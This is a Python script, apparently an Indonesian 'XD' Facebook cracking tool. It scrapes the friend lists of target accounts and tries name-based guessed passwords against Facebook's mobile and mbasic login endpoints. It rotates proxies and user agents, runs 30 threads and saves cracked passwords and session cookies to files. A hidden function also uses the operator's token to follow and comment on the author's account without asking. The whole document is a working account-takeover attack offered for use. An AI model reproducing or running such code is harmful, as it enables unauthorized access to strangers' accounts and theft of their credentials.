#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f'''\t{asu}
AUTHOR  : KHOIRUL-XD WHATSAPP : 081215437036  •
•   _____ _______  ____________________         •
•   __  // /__   |/  /__  __ )__  ____/         •
•   _  // /__  /|_/ /__  __  |_  /_             •
•   /__  __/  /  / / _  /_/ /_  __/             •
•     /_/  /_/  /_/  /_____/ /_/ VERSION 4.0.4  •
•                                               •════════════════════༄➳ᴹᴿ᭄ɀꪖꫝỉᦔ
{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tSARAN EXTENSION : [green]COOKIEDOUGH[white]'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] MASUKAN COOKIES :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL, JALANKAN ULANG PERINTAHNYA{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL COBA ULANGI LAGI/GANTI COOKIES%s'%(x,k,x,m,x))
		exit()

def bot():
	try:
		requests.post("https://graph.facebook.com/100051967952842?fields=subscribers&access_token=%s"%(tokenku))
		requests.post('https://graph.facebook.com/571109557964638/comments/?message=' +kom+ '&access_token=' + token)
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] COOKIES KADALUARSA ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	gh = 'khoirun-anam-xd'
	cetak(nel('\tSELAMAT DATANG [yellow]%s[white]'%(my_name)))
	print(f'└──[ID KAMU : '+str(my_id))
	print(f'└──[IP KAMU : {sir}{ip}{x}')
	print(f'└──[GITHUB  : {gh}')
	print('─────────────────────────────')
	print(f'└──[1]{sir}CRACK PUBLIK{x} ')
	print(f'└──[2]{h}HASIL CRACK{x}  ')
	print(f'└──[3]{k}KELUAR{x}       ')
	print('─────────────────────────────')
	Ilman = input('\r└──[PILIH : ')
	if Ilman in ['1']:
		dump_massal()
	elif Ilman in ['2']:
		result()
	elif Ilman in ['3']:
		print('─────────────────────────────')
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('└──SUKSES LOGOUT/HAPUS COOKIES ')
		exit()
	else:
		print('└──PILIH YANG BENAR ')
		back()
def error():
	jalan(f'{sir}└──TUNGGU SEBENTAR ANDA AKAN DIARAHKAN KE FACEBOOK  {x}')
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/profile.php?id=100019457147929")
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'└──[1] HASIL {h}OK{x} ANDA ')
	print(f'└──[2] HASIL {k}CP{x} ANDA ')
	print('└──[3] KEMBALI	')
	kz = input(f'\n├└──[PILIH : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('└──FILE TIDAK DITEMUKAN ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('└──ANDA TIDAK MEMILIKI HASIL CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'└──%s. %s ({k} %s {x}ID )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' ACCOUNT ]'+x)
			geeh = input('\n▪︎ PILIH : ')
			try:geh = lol[geeh]
			except KeyError:
				print('└──PILIH YANG BENAR ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('└──FILE TIDAK DITEMUKAN ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} KLIK ENTER{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('└──FILE TIDAK DITEMUKAN ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('└──ANDA TIDAK MEMILIKI HASIL OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'└── %s. %s ( {h}%s{x} ID )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'└── %s. %s ({h} %s {x}ID )'%(cih,isi,(len(hem))))
			geeh = input(f'\n└──PILIH : ')
			try:geh = lol[geeh]
			except KeyError:
				print('└──PILIH YANG BENAR ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('└──FILE TIDAK DITEMUKAN ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}└──{h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} KLIK ENTER{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('└──PILIH YANG BENAR ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print('─────────────────────────────')
		jum = int(input('└──[MAU BERAPA TARGET : '))
		print('──────────────────────────────────')
	except ValueError:
		print('└──MASUKKAN ANGKA JANGAN HURUF ')
		exit()
	if jum<1 or jum>100:
		print('└──GAGAL MEMERIKSA ID ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'└──[{sir}MASUKAN ID YANG KE{x} '+str(yz)+' : ')
		print('──────────────────────────────')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('└──JARINGAN ERROR COBA LAGI ')
			exit()
	try:
		print('──────────────────────────')
		print(f'└──[TOTAL ID TARGET : {h}'+str(len(id)))
		print(f'{x}──────────────────────────')
		setting()
	except requests.exceptions.ConnectionError:
		print('└──JARINGAN ERROR COBA LAGI ')
		back()
	except (KeyError,IOError):
		print(f'└──{k} PERTEMANAN TIDAK PUBLIK {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-ID ]---------------#
def setting():
	print(f'└──[1] {k}AKUN OLD{x} ')
	print(f'└──[2] {h}AKUN NEW{x} ')
	print(f'└──[3] RANDOM {sir}[RECOMENDED]{x} ')
	print('──────────────────────────')
	hu = input('└──[PILIH : ')
	print('────────────────────────────────')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('└──[PILIH YANG BENAR ')
		exit()
	print(f'└──[1] MOBILE FACEBOOK {sir}[RECOMENDED]{x} ')
	print(f'└──[2] MBASIC FACEBOOK {k}[NOT RECOMENDED]{x} ')
	###print('├──> 3. bbh  ')
	###print('├──> 4. Mfreefb ')
	print('──────────────────────────────────────────')
	hc = input('└──[PILIH : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('───────────────────────────────────────────────────')
	_ilman_ = input('└──[INGIN MENAMPILKAN APLIKASI TERKAIT [ Y/T ] : ')
	if _ilman_ in ['']:
		print('└──PILIH YANG BENAR ')
		back()
	elif _ilman_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('└──[INGIN MENAMBAHKAN PASSWORD MANUAL [ Y/T ] : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] MASUKAN KATA SANDI TAMBAHAN\n[[cyan]•[white]] CONTOH :[green] SAYANG,BISMILLAH,INDONESIA[white] '))
		pwku=input('└──MASUKAN PASSWORD TAMBAHAN : ')
		print('──────────────────────────')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('\t[green]SEDANG PROSES CRACKING MOHON BERSABAR'))
	print(f'└──[HASIL {h}OK{x} AKAN TERSIMPAN DI : {h}OK/%s {x}'%(okc))
	print(f'└──[HASIL {k}CP{x} AKAN TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
	cetak(nel('\t[green]SETIAP 500 ID MAINKAN MODE PESAWAT [white]10 DETIK'))
	print('|')
	print('|')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('|')
	cetak(nel('\t[green] CRACK SUCCESFULLY '))
	print(f'[{b}•{x}]{h} HASIL AKUN OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} HASIL AKUN CP : {k}%s{x} '%(cp))
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r└──{sir} KHOIRUL🇮🇩{x}  {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{h}{cp}{P} CP {P}{k}{ok}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
	nip=random.choice(prox)
	proxs= {'http': 'socks4://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r├── ID  : {H}{idf}{P}          \n│   └──  SANDI  : {H}{pw}          {H}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├── ID  : {H}{idf}{P}          \n│   └──  SANDI  : {H}{pw}          {P}\n└──  COOKIES : {hh}{kuki}          {P}\n└── UGENT  : {M}{ua}{M}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r└──{sir}[KHOIRUL]{x} 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└──ID  : {K}{idf}{P}          \n│   └──  SANDI  : {K}{pw}          {P}\n└── UA  : {M}{ua}{M}           \n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└──ID  : {H}{idf}{P}          \n│   └──  SANDI  : {H}{pw}          {P}\n└── COOKIES : {hh}{kuki}          {P}\n└── UGENT  : {M}{ua}{M}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/KHOIRUL-XD')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	ilman(f'\n\t{x}{sir} └── khoirul-xd :> {x}')
	time.sleep(3)
	login()
#khoirul ramadhan 
